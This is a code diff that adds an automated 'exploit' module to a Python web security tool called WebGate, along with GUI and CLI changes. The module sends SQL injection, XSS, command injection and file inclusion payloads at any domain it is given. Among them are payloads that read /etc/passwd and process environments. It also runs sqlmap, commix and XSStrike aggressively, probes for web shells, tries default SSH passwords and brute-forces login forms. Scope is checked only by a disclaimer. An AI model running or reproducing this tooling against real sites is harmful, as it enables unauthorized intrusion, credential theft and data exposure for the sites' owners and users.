+        for payload, error_sigs in error_payloads:
+            if self.cancelled:
+                break
+            for param in ["id", "page", "cat", "user", "search", "q"]:
+                code, body, _ = self._http_get(f"{base_url}/?{param}={payload}", timeout=6)
+                body_low = body.lower()
+                for sig in error_sigs:
+                    if sig.lower() in body_low:
+                        findings.append(f"Error-based SQLi: param={param}, payload={payload}")
+                        self._log(f"  [SQLi] VULNERABLE: ?{param}={payload} → {sig}", "ERROR")
+                        break
+
+        # Blind SQLi (time-based)
+        self._log("  [SQLi] Testing time-based blind injection...", "INFO")
+        for param in ["id", "page"]:
+            try:
+                start = time.time()
+                self._http_get(f"{base_url}/?{param}=1' AND SLEEP(3)--", timeout=8)
+                elapsed = time.time() - start
+                if elapsed >= 2.5:
+                    findings.append(f"Time-based blind SQLi: param={param}")
+                    self._log(f"  [SQLi] TIME-BASED BLIND: ?{param} (delay={elapsed:.1f}s)", "ERROR")
+            except:
+                pass
+
+        # SQLMap integration
+        if subprocess.run(["which", "sqlmap"], capture_output=True).returncode == 0:
+            self._log("  [SQLi] Running SQLMap for deep analysis...", "STEP")
+            try:
+                result = subprocess.run(
+                    ["sqlmap", "-u", f"{base_url}/?id=1",
+                     "--batch", "--level=3", "--risk=3",
+                     "--crawl=3", "--forms", "--random-agent",
+                     "--technique=BEUSTQ", "--threads=4"],
+                    capture_output=True, text=True, timeout=300
+                )
+                out = result.stdout
+                if "is vulnerable" in out.lower() or "parameter" in out.lower():
+                    findings.append("SQLMap confirmed injection points")
+                    self._log("  [SQLi] SQLMap found injection points!", "ERROR")
+                    # Extract key findings
+                    for line in out.split("\n"):
+                        if "is vulnerable" in line.lower() or "payload:" in line.lower():
+                            self._log(f"    {line.strip()[:70]}", "WARN")
+                self.results["sqlmap_output"] = out
+            except subprocess.TimeoutExpired:
+                self._log("  [SQLi] SQLMap timed out", "WARN")
+            except:
+                pass
+
+        self.results["sqli"] = findings
+        self._prog(20)
+
+    def run_xss_exploit(self):
+        """Cross-Site Scripting testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] XSS Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        xss_payloads = [
+            '<script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            "'-alert(1)-'",
+            '<svg onload=alert(1)>',
+            '{{7*7}}',  # SSTI
+            '${7*7}',   # Template injection
+            '<img src=x onerror=alert(document.cookie)>',
+            '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
+            "javascript:alert(1)//",
+            '<body onload=alert(1)>',
+        ]
+
+        for payload in xss_payloads:
+            if self.cancelled:
+                break
+            for param in ["q", "search", "name", "input", "msg", "comment", "text"]:
+                code, body, _ = self._http_get(
+                    f"{base_url}/?{param}={payload}", timeout=6
+                )
+                if payload in body:
+                    findings.append(f"Reflected XSS: param={param}")
+                    self._log(f"  [XSS] REFLECTED: ?{param} → payload echoed!", "ERROR")
+                    break
+
+        # DOM XSS indicators
+        self._log("  [XSS] Checking for DOM-based XSS indicators...", "INFO")
+        code, body, _ = self._http_get(base_url)
+        dom_sinks = ["document.write(", "innerHTML", "eval(", "setTimeout(",
+                     "location.href=", "document.location", "window.location"]
+        for sink in dom_sinks:
+            if sink in body:
+                findings.append(f"DOM XSS sink: {sink}")
+                self._log(f"  [XSS] DOM sink found: {sink}", "WARN")
+
+        # XSStrike integration
+        if subprocess.run(["which", "xsstrike"], capture_output=True).returncode == 0:
+            self._log("  [XSS] Running XSStrike...", "STEP")
+            try:
+                result = subprocess.run(
+                    ["xsstrike", "-u", f"{base_url}/?q=test", "--crawl", "--blind"],
+                    capture_output=True, text=True, timeout=120
+                )
+                if "vulnerable" in result.stdout.lower():
+                    findings.append("XSStrike confirmed XSS")
+                    self._log("  [XSS] XSStrike found vulnerabilities!", "ERROR")
+            except:
+                pass
+
+        self.results["xss"] = findings
+        self._prog(40)
+
+    def run_cmdi_exploit(self):
+        """Command injection testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] Command Injection Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        cmdi_payloads = [
+            (";id", "uid="),
+            ("|id", "uid="),
+            ("$(id)", "uid="),
+            ("`id`", "uid="),
+            (";cat /etc/passwd", "root:"),
+            ("|cat /etc/passwd", "root:"),
+            ("& ping -c 1 127.0.0.1 &", "ttl"),
+            ("; whoami", "www-data"),
+            ("| uname -a", "linux"),
+        ]
+
+        for payload, indicator in cmdi_payloads:
+            if self.cancelled:
+                break
+            for param in ["cmd", "exec", "command", "ping", "ip", "host", "url", "path"]:
+                code, body, _ = self._http_get(
+                    f"{base_url}/?{param}={payload}", timeout=6
+                )
+                if indicator.lower() in body.lower():
+                    findings.append(f"Command injection: param={param}, payload={payload}")
+                    self._log(f"  [CMDi] VULNERABLE: ?{param}={payload}", "ERROR")
+
+        # Commix integration
+        if subprocess.run(["which", "commix"], capture_output=True).returncode == 0:
+            self._log("  [CMDi] Running Commix...", "STEP")
+            try:
+                result = subprocess.run(
+                    ["commix", "--url", f"{base_url}/?cmd=test", "--batch", "--crawl=2"],
+                    capture_output=True, text=True, timeout=180
+                )
+                if "injectable" in result.stdout.lower():
+                    findings.append("Commix confirmed command injection")
+                    self._log("  [CMDi] Commix found injection!", "ERROR")
+            except:
+                pass
+
+        self.results["cmdi"] = findings
+        self._prog(55)
+
+    def run_file_upload_exploit(self):
+        """File upload vulnerability testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] File Upload Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        # Find upload forms
+        upload_paths = [
+            "upload.php", "uploader.php", "file-upload.php",
+            "admin/upload.php", "wp-admin/media-new.php",
+            "filemanager/upload.php", "api/upload", "api/v1/upload",
+        ]
+
+        for path in upload_paths:
+            if self.cancelled:
+                break
+            code, body, _ = self._http_get(f"{base_url}/{path}")
+            if code in (200, 302) and any(x in body.lower() for x in ["upload", "file", "multipart"]):
+                findings.append(f"Upload endpoint found: /{path}")
+                self._log(f"  [Upload] Endpoint found: /{path} (HTTP {code})", "FOUND")
+
+                # Try uploading a test file (harmless .txt)
+                boundary = "----WebGateTest" + self.session_id
+                test_content = f"WebGate Security Test - {self.session_id}"
+                body_data = (
+                    f"--{boundary}\r\n"
+                    f'Content-Disposition: form-data; name="file"; filename="test_{self.session_id}.txt"\r\n'
+                    f"Content-Type: text/plain\r\n\r\n"
+                    f"{test_content}\r\n"
+                    f"--{boundary}--\r\n"
+                ).encode()
+
+                try:
+                    req = Request(f"{base_url}/{path}", data=body_data, headers={
+                        "Content-Type": f"multipart/form-data; boundary={boundary}",
+                        "User-Agent": "Mozilla/5.0"
+                    })
+                    with urlopen(req, timeout=10) as resp:
+                        if resp.status in (200, 201):
+                            findings.append(f"File upload accepted at /{path}")
+                            self._log(f"  [Upload] File accepted at /{path}!", "ERROR")
+                except:
+                    pass
+
+        # Check for unrestricted upload by extension
+        dangerous_exts = [".php", ".phtml", ".php5", ".asp", ".aspx", ".jsp", ".sh"]
+        for ext in dangerous_exts:
+            code, _, _ = self._http_get(f"{base_url}/uploads/test{ext}")
+            if code in (200, 403):
+                findings.append(f"Upload directory accessible for {ext}")
+                self._log(f"  [Upload] {ext} files accessible in /uploads/", "WARN")
+
+        self.results["file_upload"] = findings
+        self._prog(65)
+
+    def run_backdoor_check(self):
+        """Check for existing backdoors and deploy test payload."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] Backdoor / Shell Detection & Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        # Check for existing shells
+        shells = [
+            "shell.php", "cmd.php", "c99.php", "r57.php", "wso.php",
+            "b374k.php", "weevely.php", "alfa.php", "mini.php",
+            "0day.php", "backdoor.php", "hack.php", "1.php",
+            ".shell.php", ".backdoor.php", "wp-content/uploads/shell.php",
+        ]
+
+        for shell_path in shells:
+            if self.cancelled:
+                break
+            code, body, _ = self._http_get(f"{base_url}/{shell_path}", timeout=5)
+            if code == 200 and len(body) > 50:
+                findings.append(f"Existing shell found: /{shell_path}")
+                self._log(f"  [SHELL] FOUND: /{shell_path} ({len(body)} bytes)", "ERROR")
+
+        # Check for common backdoor indicators
+        code, body, headers = self._http_get(base_url)
+        backdoor_indicators = [
+            ("eval(base64_decode", "PHP eval backdoor"),
+            ("system($_GET", "PHP system backdoor"),
+            ("exec($_GET", "PHP exec backdoor"),
+            ("passthru(", "PHP passthru backdoor"),
+            ("shell_exec(", "PHP shell_exec backdoor"),
+        ]
+        for indicator, name in backdoor_indicators:
+            if indicator in body:
+                findings.append(f"Backdoor indicator: {name}")
+                self._log(f"  [BACKDOOR] Indicator: {name}", "ERROR")
+
+        # SSH brute force check (if paramiko available)
+        if PARAMIKO_OK:
+            self._log("  [SSH] Testing default credentials...", "INFO")
+            default_creds = [
+                ("root", "root"), ("root", "toor"), ("admin", "admin"),
+                ("root", "password"), ("root", "123456"), ("admin", "password"),
+                ("pi", "raspberry"), ("ubnt", "ubnt"),
+            ]
+            try:
+                ip = socket.gethostbyname(self.domain)
+                s = socket.socket(); s.settimeout(3)
+                if s.connect_ex((ip, 22)) == 0:
+                    s.close()
+                    for user, passwd in default_creds:
+                        if self.cancelled:
+                            break
+                        try:
+                            client = paramiko.SSHClient()
+                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                            client.connect(ip, port=22, username=user, password=passwd, timeout=5)
+                            findings.append(f"SSH default creds: {user}:{passwd}")
+                            self._log(f"  [SSH] DEFAULT CREDS WORK: {user}:{passwd}", "ERROR")
+                            client.close()
+                            break
+                        except paramiko.AuthenticationException:
+                            pass
+                        except:
+                            break
+                else:
+                    s.close()
+            except:
+                pass
+
+        self.results["backdoor"] = findings
+        self._prog(80)
+
+    def run_lfi_rfi_exploit(self):
+        """Local/Remote File Inclusion testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] LFI/RFI Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        lfi_payloads = [
+            ("../../../../etc/passwd", "root:"),
+            ("....//....//....//etc/passwd", "root:"),
+            ("/etc/passwd%00", "root:"),
+            ("php://filter/convert.base64-encode/resource=index.php", "PD"),
+            ("php://input", ""),
+            ("../../../../../../windows/win.ini", "[fonts]"),
+            ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
+            ("/proc/self/environ", "PATH="),
+        ]
+
+        for payload, indicator in lfi_payloads:
+            if self.cancelled:
+                break
+            for param in ["page", "file", "path", "include", "template", "doc", "lang"]:
+                code, body, _ = self._http_get(
+                    f"{base_url}/?{param}={payload}", timeout=6
+                )
+                if indicator and indicator in body:
+                    findings.append(f"LFI: param={param}, payload={payload}")
+                    self._log(f"  [LFI] VULNERABLE: ?{param}={payload}", "ERROR")
+                    break
+
+        self.results["lfi_rfi"] = findings
+        self._prog(90)
+
+    def run_brute_force(self):
+        """Login brute force testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] Brute Force Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        # Find login forms
+        login_paths = [
+            "wp-login.php", "admin/", "login", "signin",
+            "administrator/", "user/login", "auth/login",
+            "panel/", "cpanel/", "webmail/",
+        ]
+
+        login_url = None
+        for path in login_paths:
+            code, body, _ = self._http_get(f"{base_url}/{path}")
+            if code == 200 and any(x in body.lower() for x in ["password", "login", "sign in", "пароль"]):
+                login_url = f"{base_url}/{path}"
+                findings.append(f"Login form: /{path}")
+                self._log(f"  [Brute] Login form found: /{path}", "FOUND")
+                break
+
+        if login_url:
+            default_creds = [
+                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+                ("admin", "admin123"), ("root", "root"), ("test", "test"),
+                ("admin", ""), ("administrator", "administrator"),
+            ]
+
+            for user, passwd in default_creds:
+                if self.cancelled:
+                    break
+                code, body = self._http_post(
+                    login_url,
+                    f"log={user}&pwd={passwd}&wp-submit=Log+In&redirect_to=wp-admin/",
+                )
+                if code in (302, 200) and "dashboard" in body.lower():
+                    findings.append(f"Default credentials: {user}:{passwd}")
+                    self._log(f"  [Brute] CREDENTIALS FOUND: {user}:{passwd}", "ERROR")
+                    break
+
+        # Hydra integration
+        if login_url and subprocess.run(["which", "hydra"], capture_output=True).returncode == 0:
+            self._log("  [Brute] Hydra available for extended brute force", "INFO")
+
+        self.results["brute_force"] = findings
+        self._prog(95)
+
+    def generate_report(self) -> str:
+        """Generate exploit session report."""
+        self._log("Generating exploit report...", "STEP")
+        ts = datetime.now()
+        safe = re.sub(r"[^\w\-.]", "_", self.domain)
+        fn = os.path.join(_REPORTS_DIR, f"exploit_{safe}_{ts.strftime('%Y%m%d_%H%M%S')}.txt")
+
+        lines = [
+            "=" * 72,
+            "  WEBGATE v4.0 — EXPLOIT SESSION REPORT",
+            f"  Session ID: {self.session_id}",
+            f"  Target: {self.domain}",
+            f"  Date: {ts.strftime('%Y-%m-%d %H:%M:%S')}",
+            "=" * 72, "",
+        ]
+
+        total_findings = 0
+        for module, findings in self.results.items():
+            if isinstance(findings, list) and findings:
+                lines.append(f"  [{module.upper()}]")
+                lines.append("  " + "-" * 40)
+                for f in findings:
+                    lines.append(f"    ! {f}")
+                    total_findings += 1
+                lines.append("")
+
+        lines.extend([
+            "=" * 72,
+            f"  TOTAL FINDINGS: {total_findings}",
+            "  DISCLAIMER: This report is for authorized testing only.",
+            "=" * 72,
+        ])
+
+        try:
+            with open(fn, "w", encoding="utf-8") as f:
+                f.write("\n".join(lines))
+            self._log(f"  Report saved: {fn}", "FOUND")
+        except Exception as e:
+            self._log(f"  Save failed: {e}", "ERROR")
+
+        self._prog(100)
+        return fn
+
+    def run(self):
+        """Execute all exploit modules."""
+        self._log(f"Exploit session started: {self.domain}", "STEP")
+        self._log(f"Session ID: {self.session_id}", "INFO")
+
+        modules = [
+            self.run_sqli_exploit,
+            self.run_xss_exploit,
+            self.run_cmdi_exploit,
+            self.run_file_upload_exploit,
+            self.run_backdoor_check,
+            self.run_lfi_rfi_exploit,
+            self.run_brute_force,
+            self.generate_report,
+        ]
+
+        for module in modules:
+            if self.cancelled:
+                break
+            try:
+                module()
+            except Exception as e:
+                self._log(f"  Module error: {e}", "ERROR")
+
+        self._log("Exploit session complete.", "SUCCESS")
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -2535,7 +4343,9 @@ class RoundedButton(object):
             except: pbg = "#0a0d14"
 
         if not width:
-            width = max(90, len(self._text)*8 + 42)
+            # Cyrillic chars ~1.4x wider than ASCII in most fonts
+            char_w = sum(14 if ord(c) > 127 else 8 for c in self._text)
+            width = max(90, char_w + 42)
 
         self.widget = tk.Canvas(parent, width=width, height=height,
                                 highlightthickness=0, bd=0, bg=pbg,
@@ -2603,8 +4413,26 @@ class RoundedButton(object):
 
     def _on_press(self, _):
         self._draw(self._pbg)
+        play_click()
+        # Shrink effect: briefly reduce size by 2px inset
+        cv = self.widget
+        try:
+            w = cv.winfo_width() or int(cv.cget("width"))
+            h = cv.winfo_height() or int(cv.cget("height"))
+            r = min(self._radius, w//2-1, h//2-1)
+            ins = 2
+            pts = [r+ins,ins, w-r-ins,ins, w-ins,r+ins, w-ins,h-r-ins,
+                   w-r-ins,h-ins, r+ins,h-ins, ins,h-r-ins, ins,r+ins]
+            cv.create_polygon(pts, smooth=True, fill=self._pbg, outline="", tags="press_overlay")
+            fg = self._dis_fg if self._disabled else self._fg
+            cv.create_text(w//2, h//2+1, text=self._text, fill=fg,
+                           font=self._font, anchor="center", tags="press_overlay")
+        except Exception:
+            pass
 
     def _on_release(self, _):
+        try: self.widget.delete("press_overlay")
+        except: pass
         self._draw(self._hbg if self._hover else self._bg)
         if self._cmd and not self._disabled:
             self._cmd()
@@ -2691,25 +4519,17 @@ class SecurityScannerGUI:
         top = tk.Frame(root, bg=th["BG"])
         top.pack(fill="x")
 
-        # Logo
-        logo_cv = tk.Canvas(top, bg=th["BG"], height=72,
-                             highlightthickness=0, width=380)
+        # Logo — only the text, no underlines or badge text
+        logo_cv = tk.Canvas(top, bg=th["BG"], height=56,
+                             highlightthickness=0, width=320)
         logo_cv.pack(side="left", padx=24, pady=8)
         # Shadow layers
-        for dx, dy, col in [(5,38,th["BG4"]),(3,36,th["LOGO_SHD"]),(1,34,th["LOGO_SHD"])]:
+        for dx, dy, col in [(4,32,th["BG4"]),(2,30,th["LOGO_SHD"]),(1,29,th["LOGO_SHD"])]:
             logo_cv.create_text(dx, dy, text="WebGate",
                 font=("Georgia", 40, "bold italic"), fill=col, anchor="w")
         # Main logo text
-        logo_cv.create_text(0, 33, text="WebGate",
+        logo_cv.create_text(0, 28, text="WebGate",
             font=("Georgia", 40, "bold italic"), fill=th["LOGO_CLR"], anchor="w")
-        # Accent underline (gradient-like double line)
-        logo_cv.create_line(0, 52, 260, 52, fill=th["ACC"], width=2)
-        logo_cv.create_line(0, 55, 160, 55, fill=th["BORDER3"], width=1)
-        # CVE count badge
-        cve_n = get_all_cve_count()
-        logo_cv.create_text(0, 66,
-            text=f"by c3less  ·  {cve_n} CVE  ·  30 tools",
-            font=(self.font, 8), fill=th["FG3"], anchor="w")
 
         # Right controls
         rc = tk.Frame(top, bg=th["BG"])
@@ -2738,7 +4558,7 @@ class SecurityScannerGUI:
         self._lang_rbtn.pack(side="right", padx=4)
 
         # Theme toggle
-        theme_names = {"dark":"DARK","light":"LIGHT","midnight":"NIGHT","hacker":"HACK","custom":"CUST"}
+        theme_names = {"dark":"DARK","mono":"MONO","light":"LITE","midnight":"NIGHT","hacker":"HACK","custom":"CUST"}
         self._theme_rbtn = RoundedButton(rc,
             text=theme_names.get(SETTINGS["theme"], "DARK"),
             bg=th["BG3"], fg=th["FG"], hover_bg=th["BORDER3"],
@@ -2746,13 +4566,7 @@ class SecurityScannerGUI:
             command=self._cycle_theme, parent_bg=th["BG"])
         self._theme_rbtn.pack(side="right", padx=4)
 
-        # Instructions
-        instr = tk.Label(top, text=t("instructions"),
-            font=(self.font, 8), bg=th["BG"], fg=th["FG3"],
-            justify="left", anchor="w")
-        instr.pack(side="left", padx=(10, 0))
-
-        tk.Frame(root, bg=th["BORDER"], height=1).pack(fill="x")
+        # (instructions label removed, separator line removed)
 
         # ── INPUT ROW ──────────────────────────────────────────
         inrow = tk.Frame(root, bg=th["BG2"])
@@ -2786,13 +4600,19 @@ class SecurityScannerGUI:
         self._entry.bind("<FocusIn>",  self._ef_in,  add="+")
         self._entry.bind("<FocusOut>", self._ef_out, add="+")
 
+        # Determine minimum button widths based on language
+        _is_ru = SETTINGS.get("lang", "EN") == "RU"
+        _scan_w  = 180 if _is_ru else 160
+        _deep_w  = 190 if _is_ru else 160
+        _cancel_w = 160 if _is_ru else 130
+
         # Main SCAN button
         self._scan_rbtn = RoundedButton(inner,
             text=t("scan_btn"), icon="▶",
             bg=th["BTN_BG"], fg=th["BTN_FG"],
             hover_bg=th["BTN_HOV"], press_bg=th["BTN_BG"],
-            font_spec=(self.font, 12, "bold"),
-            height=42, radius=12, command=self._on_scan,
+            font_spec=(self.font, 11, "bold"),
+            height=42, width=_scan_w, radius=12, command=self._on_scan,
             parent_bg=th["BG2"])
         self._scan_rbtn.pack(side="left", padx=(14, 0))
         self._btn = self._scan_rbtn  # compat alias
@@ -2802,7 +4622,7 @@ class SecurityScannerGUI:
             text=t("deep_btn"), icon="⚡",
             bg=th["BG4"], fg=th["FG"],
             hover_bg=th["BORDER2"],
-            font_spec=(self.font, 10), height=42, radius=12,
+            font_spec=(self.font, 10), height=42, width=_deep_w, radius=12,
             command=self._on_deep_scan, parent_bg=th["BG2"])
         self._deep_rbtn.pack(side="left", padx=(8, 0))
         self._deep_btn = self._deep_rbtn  # compat alias
@@ -2812,7 +4632,7 @@ class SecurityScannerGUI:
             text=t("cancel_btn"), icon="✕",
             bg="#3a1a1a", fg=th["ERR"],
             hover_bg="#5a2a2a",
-            font_spec=(self.font, 10), height=42, radius=12,
+            font_spec=(self.font, 10), height=42, width=_cancel_w, radius=12,
             command=self._on_cancel, parent_bg=th["BG2"])
         self._cancel_btn = self._cancel_rbtn  # compat alias
 
@@ -3059,16 +4879,18 @@ class SecurityScannerGUI:
         if self.scanning: return
         SETTINGS["lang"] = "RU" if SETTINGS["lang"] == "EN" else "EN"
         save_settings(SETTINGS)
+        play_click()
         self._apply_theme(animated=True)
 
     def _cycle_theme(self):
         if self.scanning: return
         order = [n for n in THEME_ORDER if n != "custom"]
         cur   = SETTINGS.get("theme", "dark")
-        nxt   = order[(order.index(cur) if cur in order else 0) + 1 if
-                      (order.index(cur) if cur in order else 0) + 1 < len(order) else 0]
+        idx   = order.index(cur) if cur in order else 0
+        nxt   = order[(idx + 1) % len(order)]
         SETTINGS["theme"] = nxt
         save_settings(SETTINGS)
+        play_click()
         self._apply_theme(animated=True)
 
     def _apply_theme(self, animated=False):
@@ -3241,10 +5063,62 @@ class SecurityScannerGUI:
     def _copy_log(self):
         try:
             content = self._log_w.get("1.0", "end-1c")
-            self.root.clipboard_clear()
-            self.root.clipboard_append(content)
-            self.root.update()  # Keep clipboard alive
-            self._push(t("copied"), "SUCCESS")
+            copied = False
+
+            # Try system clipboard tools first (persistent — survive window close)
+            if sys.platform.startswith("linux"):
+                # Detect Wayland vs X11
+                wayland = bool(os.environ.get("WAYLAND_DISPLAY") or
+                               os.environ.get("XDG_SESSION_TYPE", "").lower() == "wayland")
+                if wayland:
+                    for cmd in [["wl-copy"], ["xclip", "-selection", "clipboard"],
+                                 ["xdotool", "type", "--clearmodifiers"]]:
+                        try:
+                            if subprocess.run(["which", cmd[0]],
+                                    capture_output=True, timeout=2).returncode == 0:
+                                if cmd[0] == "wl-copy":
+                                    p = subprocess.Popen(["wl-copy"],
+                                        stdin=subprocess.PIPE,
+                                        stdout=subprocess.DEVNULL,
+                                        stderr=subprocess.DEVNULL)
+                                    p.communicate(content.encode())
+                                    copied = True; break
+                                elif cmd[0] == "xclip":
+                                    p = subprocess.Popen(["xclip", "-selection", "clipboard"],
+                                        stdin=subprocess.PIPE,
+                                        stdout=subprocess.DEVNULL,
+                                        stderr=subprocess.DEVNULL)
+                                    p.communicate(content.encode())
+                                    copied = True; break
+                        except Exception:
+                            continue
+                else:
+                    for cmd in [["xclip", "-selection", "clipboard"],
+                                 ["xsel", "--clipboard", "--input"],
+                                 ["wl-copy"]]:
+                        try:
+                            if subprocess.run(["which", cmd[0]],
+                                    capture_output=True, timeout=2).returncode == 0:
+                                p = subprocess.Popen(cmd,
+                                    stdin=subprocess.PIPE,
+                                    stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+                                p.communicate(content.encode())
+                                copied = True; break
+                        except Exception:
+                            continue
+
+            # Fallback: tkinter clipboard (may not persist after window close)
+            if not copied:
+                self.root.clipboard_clear()
+                self.root.clipboard_append(content)
+                self.root.update()
+                copied = True
+
+            if copied:
+                self._push(t("copied"), "SUCCESS")
+            else:
+                self._push("Clipboard: install xclip or wl-copy", "WARN")
         except Exception as e:
             self._push(f"Clipboard error: {e}", "ERROR")
 
@@ -3457,61 +5331,344 @@ class SecurityScannerGUI:
 # CLI INTERFACE
 # ═══════════════════════════════════════════════════════════════
 class CLIInterface:
+    def __init__(self):
+        self._last_prog = -1
+        self._scope_agreed = False
+
+    def log_cb(self, msg, level):
+        pfx = {"INFO":    C.GRY  + "·",
+               "FOUND":   C.WHT  + "+",
+               "WARN":    C.YLW  + "!",
+               "ERROR":   C.RED  + "✗",
+               "STEP":    C.BLU  + "»",
+               "SUCCESS": C.GRN  + "✓"}.get(level, "·")
+        print(f"  {pfx}{C.RST} {msg}")
+
+    def prog_cb(self, v):
+        v = int(v)
+        if v == self._last_prog: return
+        self._last_prog = v
+        bar = "█" * (v // 5) + "░" * (20 - v // 5)
+        print(f"\r  {C.GRY}[{bar}] {v:3d}%{C.RST}", end="", flush=True)
+        if v >= 100:
+            print()
+
     def shell(self):
         print(BANNER)
-        print(f"{C.DIM}  Type a domain to scan, 'deep <domain>' for deep scan,")
-        print(f"  'help' for options, 'exit' to quit.{C.RST}\n")
+        print(f"{C.DIM}  WebGate v4.0 — Domain Security Auditor + Network Agent + Exploit Framework")
+        print(f"  Type 'help' for commands, 'exit' to quit.{C.RST}\n")
         while True:
             try:
                 raw = input(f"  {C.WHT}webgate{C.RST}{C.GRY}>{C.RST} ").strip()
             except (KeyboardInterrupt, EOFError):
                 print(f"\n  {C.GRY}Bye!{C.RST}"); break
             if not raw: continue
-            if raw in ("exit", "quit", "q"): print(f"  {C.GRY}Bye!{C.RST}"); break
-            if raw in ("help", "?"):
-                self._help(); continue
-            if raw in ("gui", "--gui"):
+            cmd_parts = raw.split(None, 1)
+            cmd = cmd_parts[0].lower()
+            arg = cmd_parts[1].strip() if len(cmd_parts) > 1 else ""
+
+            if cmd in ("exit", "quit", "q"):
+                print(f"  {C.GRY}Bye!{C.RST}"); break
+            elif cmd in ("help", "?"):
+                self._help()
+            elif cmd in ("gui", "--gui"):
                 print(f"  {C.BLU}»{C.RST} Launching GUI…")
                 launch_gui(); return
-            if raw.startswith("deep "):
-                self.quick(raw[5:].strip(), deep=True)
+            elif cmd == "deep":
+                if not arg:
+                    print(f"  {C.RED}Usage: deep <domain>{C.RST}"); continue
+                self.quick(arg, deep=True)
+            elif cmd == "agent":
+                self.agent_mode()
+            elif cmd == "exploit":
+                if not arg:
+                    print(f"  {C.RED}Usage: exploit <domain>{C.RST}"); continue
+                self.exploit_mode(arg)
+            elif cmd == "finger":
+                if not arg:
+                    print(f"  {C.RED}Usage: finger <domain>{C.RST}"); continue
+                self.fingerprint(arg)
+            elif cmd == "verify":
+                if not arg:
+                    print(f"  {C.RED}Usage: verify <domain>{C.RST}"); continue
+                self.verify_cve(arg)
+            elif cmd == "full":
+                if not arg:
+                    print(f"  {C.RED}Usage: full <domain>{C.RST}"); continue
+                self.full_scan(arg)
+            elif cmd == "subs":
+                if not arg:
+                    print(f"  {C.RED}Usage: subs <domain>{C.RST}"); continue
+                self.enum_subdomains(arg)
+            elif cmd == "bulk":
+                if not arg:
+                    print(f"  {C.RED}Usage: bulk <file.txt>{C.RST}"); continue
+                self.bulk_scan(arg)
+            elif cmd == "proxy":
+                if not arg:
+                    print(f"  {C.GRY}Current proxy: {_PROXY_CONFIG['http'] or 'none'}{C.RST}")
+                    print(f"  {C.GRY}Usage: proxy http://host:port  or  proxy off{C.RST}")
+                elif arg == "off":
+                    set_proxy(""); print(f"  {C.GRN}Proxy disabled{C.RST}")
+                else:
+                    set_proxy(arg); print(f"  {C.GRN}Proxy set: {arg}{C.RST}")
+                continue
+            elif cmd == "export":
+                self._export_info()
+            elif cmd == "settings":
+                self._show_settings()
+            elif cmd == "tools":
+                self._show_tools()
+            elif cmd == "version":
+                print(f"  {C.WHT}WebGate v4.0{C.RST} by c3less")
             else:
+                # Treat as domain scan
                 self.quick(raw)
 
     def quick(self, domain: str, deep: bool = False):
         print(f"\n  {C.WHT}[*]{C.RST} Target: {C.BOLD}{domain}{C.RST}")
         print(f"  {C.GRY}{'─' * 56}{C.RST}")
         self._last_prog = -1
-        def log_cb(msg, level):
-            pfx = {"INFO":    C.GRY  + "·",
-                   "FOUND":   C.WHT  + "+",
-                   "WARN":    C.YLW  + "!",
-                   "ERROR":   C.RED  + "✗",
-                   "STEP":    C.BLU  + "»",
-                   "SUCCESS": C.GRN  + "✓"}.get(level, "·")
-            print(f"  {pfx}{C.RST} {msg}")
-        def prog_cb(v):
-            v = int(v)
-            if v == self._last_prog: return
-            self._last_prog = v
-            bar = "█" * (v // 5) + "░" * (20 - v // 5)
-            print(f"  {C.GRY}[{bar}] {v:3d}%{C.RST}")
-        sc = DomainScanner(domain, log_cb=log_cb, prog_cb=prog_cb)
+        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
         report = sc.run()
+
+        # Run fingerprinting
+        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
+        fp_result = fp.fingerprint()
+
+        # Run CVE verification on open ports
+        open_ports = sc.results.get("ports", {}).get("open", [])
+        if open_ports:
+            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
+            cv.verify_all()
+
         if deep and not sc.cancelled:
-            ds = DeepScanner(domain, log_cb=log_cb, prog_cb=prog_cb)
+            ds = DeepScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
             ds.run()
         if report:
             print(f"\n  {C.GRN}[✓]{C.RST} Report: {report}\n")
 
+    def fingerprint(self, domain: str):
+        """Standalone fingerprinting command."""
+        print(f"\n  {C.WHT}[*]{C.RST} Fingerprinting: {C.BOLD}{domain}{C.RST}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        fp = ServiceFingerprinter(domain, log_cb=self.log_cb)
+        result = fp.fingerprint()
+        print(f"\n  {C.GRN}[✓]{C.RST} Fingerprint complete\n")
+
+    def verify_cve(self, domain: str):
+        """Standalone CVE verification."""
+        print(f"\n  {C.WHT}[*]{C.RST} CVE Verification: {C.BOLD}{domain}{C.RST}")
+        print(f"  {C.GRY}{'─' * 56}{C.RST}")
+        self._last_prog = -1
+        sc = DomainScanner(domain, log_cb=self.log_cb, prog_cb=self.prog_cb)
+        sc.run()
+        open_ports = sc.results.get("ports", {}).get("open", [])
+        if open_ports:
+            cv = CVEVerifier(domain, open_ports, log_cb=self.log_cb)
+            verified = cv.verify_all()
+            likely = [v for v in verified if v["status"] == "LIKELY"]
+            if likely:
